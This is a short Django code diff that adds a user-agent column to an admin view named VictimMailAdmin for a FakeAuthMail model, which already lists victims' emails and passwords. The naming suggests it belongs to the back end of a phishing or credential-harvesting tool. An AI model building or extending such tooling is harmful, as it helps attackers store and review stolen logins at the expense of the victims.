@@ -5,4 +5,4 @@ from .models.fakeauth import FakeAuthMail
 
 @admin.register(FakeAuthMail)
 class VictimMailAdmin(admin.ModelAdmin):
-    list_display = ('email', 'password')
+    list_display = ('email', 'password', 'user_agent')
